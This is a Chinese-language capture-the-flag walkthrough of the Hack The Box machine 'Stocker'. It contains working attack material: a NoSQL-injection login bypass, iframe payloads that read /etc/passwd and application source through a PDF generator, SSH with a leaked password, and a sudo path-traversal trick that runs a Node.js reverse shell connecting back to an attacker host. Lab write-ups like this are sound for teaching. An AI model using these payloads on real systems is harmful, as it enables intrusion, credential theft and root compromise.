## Hack The Box Level Stocker

### 第一步：信息收集

拿到IP地址：**10.10.11.196**

nmap扫描一下端口，查看开放的端口以及可能存在的服务。

```shell
┌──(root㉿kali)-[/usr/share/wordlists/wfuzz/webservices]
└─# nmap -sV -sC 10.10.11.196
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 16:32 CST
Nmap scan report for 10.10.11.196
Host is up (1.5s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.94 seconds
```

两个端口

```shell
22:ssh
80:http
```

并且80端口被重定向到http://stocker.htb，我们需要手动解析一下这个url到目标到IP地址。

```shell
[2023- 6-10 16:33:34 CST] Fanxiaoyao htb/Stocker
🔍🤡 -> curl http://stocker.htb
curl: (6) Could not resolve host: stocker.htb
```

在/etc/hosts 中解析IP地址到此域名，见最后一行。

```shell
[2023- 6-10 16:42:31 CST] Fanxiaoyao htb/Stocker
🔍🤡 -> cat /etc/hosts
##
# Host Database
#
# localhost is used to configure the loopback interface
# when the system is booting.  Do not change this entry.
##
127.0.0.1	localhost
255.255.255.255	broadcasthost
::1             localhost
# Added by Docker Desktop
# To allow the same kube context to work on the host and the container:
127.0.0.1 kubernetes.docker.internal
# End of section
10.211.55.13   	kali-linux-2022.2-arm64.shared kali-linux-2022.2-arm64 #prl_hostonly shared
10.10.11.196 stocker.htb
```

已经可以通过web访问此页面了。

从上看到下，没有找到可以利用的点。改变一下思路，找一下vhost。

```shell
🔍🤡 -> gobuster vhost -w /Users/xxx/workspace/tools/lists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /Users/xxx/workspace/tools/lists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/06/10 16:49:20 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
Progress: 4989 / 4990 (99.98%)
===============================================================
2023/06/10 16:49:55 Finished
===============================================================
```

有个子域名：dev.stocker.htb，再在/etc/hosts中手动解析一次。

### 第二步：渗透

web访问，重定向到一个login页面。

burp抓包，尝试：

- 暴力破解❌
- 常规SQLi❌
- 参数变形❌
- POST改GET❌
- Nosql注入

修改Content-Type为 application/json，data为：{"username":{"$ne":"admin"}, "password":{"$ne":"pass"}}

参考：https://book.hacktricks.xyz/pentesting-web/nosql-injection & https://www.secpulse.com/archives/3278.html

返回：

```shel
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 10 Jun 2023 09:09:04 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
X-Powered-By: Express
Location: /stock
Vary: Accept

<p>Found. Redirecting to <a href="/stock">/stock</a></p>
```

这里是一个添加商品并且购买的页面，购买完成会根据你购买的物品自动生成一个PDF收据。

下载下来用exiftool分析一下：

```shell
┌──(root㉿kali)-[/usr/share/wordlists/wfuzz/webservices]
└─# exiftool /root/桌面/document.pdf
ExifTool Version Number         : 12.57
File Name                       : document.pdf
Directory                       : /root/桌面
File Size                       : 44 kB
File Modification Date/Time     : 2023:06:08 19:32:14+08:00
File Access Date/Time           : 2023:06:08 19:32:33+08:00
File Inode Change Date/Time     : 2023:06:08 19:32:33+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Tagged PDF                      : Yes
Creator                         : Chromium
Producer                        : Skia/PDF m108
Create Date                     : 2023:06:08 10:55:47+00:00
Modify Date                     : 2023:06:08 10:55:47+00:00
```

找一下Skia CVE/ skia/pdf exploit

参考：https://techkranti.com/ssrf-aws-metadata-leakage/ & https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file

是一个**sXSS->SSRF**的过程

抓包修改data：

```shell
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe src='file:///etc/passwd' width='800' height='1050'></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

重点在这，titile对应的值改为：

```html
<iframe src='file:///etc/passwd' width='800' height='1050'></iframe>
```

![image-20230610172653225](/images/:Users:fanhexuan:Libr.png)

除了root还有一个angoose用户。

中间件是nginx的，看一下nginx的配置文件。

```html
<iframe src='file:///etc/nginx/nginx.conf' width='800' height='1050'></iframe>
```

可以找到http的root路径：/var/www/dev

或者直接通过修改data值使后端错误爆出路径地址。

```json	
{"basket":，，，[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

返回如下：

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected token ， in JSON at position 10<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/var/www/dev/node_modules/body-parser/lib/types/json.js:89:19)<br> &nbsp; &nbsp;at /var/www/dev/node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:203:9)<br> &nbsp; &nbsp;at invokeCallback (/var/www/dev/node_modules/raw-body/index.js:231:16)<br> &nbsp; &nbsp;at done (/var/www/dev/node_modules/raw-body/index.js:220:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/var/www/dev/node_modules/raw-body/index.js:280:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (node:events:513:28)<br> &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1359:12)<br> &nbsp; &nbsp;at process.processTicksAndRejections (node:internal/process/task_queues:82:21)</pre>
</body>
</html>
```

​	知道了网站的根目录，找一下目录下有没有什么有用的东西。

```html
<iframe src='file:///var/www/dev/index.js' height=1050px width=800px></iframe>
```

发现一个很像密码的内容：

![image-20230610173844308](images/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230610173844308.png)

用前面看到的用户尝试ssh连一下：

```shell
┌──(root㉿kali)-[/usr/share/wordlists/wfuzz/webservices]
└─# sshpass -p IHeardPassphrasesArePrettySecure ssh angoose@10.10.11.196

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$
```

成功登陆，拿到user flag。

### 第三步：提权

本地开个web server，传个linpeas上去看一下扫描的结果。或者直接sudo -l。

```shell
angoose@stocker:~$ sudo -l
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

发现可以root运行/usr/local/scripts下的js文件，这就好办了，写个js的反向shell传上去:

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(9999, "10.10.16.2", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

Attacker：

```shell
[2023- 6-10 17:51:08 CST] Fanxiaoyao ~/Downloads
🔍🤡 -> code payload.js
[2023- 6-10 17:51:27 CST] Fanxiaoyao ~/Downloads
🔍🤡 -> python3 -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:10.10.11.196 - - [10/Jun/2023 17:53:01] "GET /payload.js HTTP/1.1" 200 -

```

Victim:

```shell
angoose@stocker:~$ wget 10.10.16.2:8000/payload.js
--2023-06-10 09:53:00--  http://10.10.16.2:8000/payload.js
Connecting to 10.10.16.2:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 393 [application/javascript]
Saving to: ‘payload.js’

payload.js                              100%[===============================================================================>]     393  --.-KB/s    in 0s

2023-06-10 09:53:01 (24.7 MB/s) - ‘payload.js’ saved [393/393]

angoose@stocker:~$ ls
payload.js  user.txt
```

运行payload：

```shell
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/payload.js
```

拿到root权限：

```shell
[2023- 6-10 17:51:08 CST] Fanxiaoyao htb/Stocker
🔍🤡 -> ncat -lvnp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.11.196.
Ncat: Connection from 10.10.11.196:40370.
whoami
root
```

